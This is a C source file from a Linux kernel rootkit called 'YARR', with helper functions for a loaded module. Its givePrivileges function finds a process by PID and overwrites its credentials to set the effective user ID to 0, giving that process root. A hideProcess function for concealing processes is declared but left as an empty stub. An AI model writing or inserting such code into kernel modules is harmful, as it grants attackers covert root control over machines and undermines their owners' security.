/*
 *  YARR - Yet Another Repetitive Rootkit
 *  Copyright (C) 2011 Ole 
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 1, or (at your option)
 *  any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the 
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.
 */

#include <linux/sched.h>

#include "yarrops.h"
#include "debug.h"

// TODO: Should this take the RCU read lock?.
/***
 * Returns the pointer to the task struct of the process with the pid passed.
 *
 * @pid: The pid of the process.
 * @return: The pointer to the task struct or NULL.
 */
struct task_struct *get_task_by_pid(pid_t pid) {
	struct task_struct *tsk;

	for_each_process(tsk)
		if (tsk->pid == pid)
			return tsk;

	return NULL;
}

int givePrivileges(pid_t pid) {
	struct task_struct *tsk;
	int res = -1;

	// Search the task that has the pid passed and change its euid. Note that
	// the cast is necessary since task->cred is "const struct cred *".
	rcu_read_lock();
	tsk = get_task_by_pid(pid);
	if (tsk != NULL) {
		((struct cred *)tsk->cred)->euid = 0;
		res = 0;
	}

	rcu_read_unlock();
	return res;
}

// TODO: Implement it :).
int hideProcess(pid_t pid) {
	int res = -1;

	return res;
}

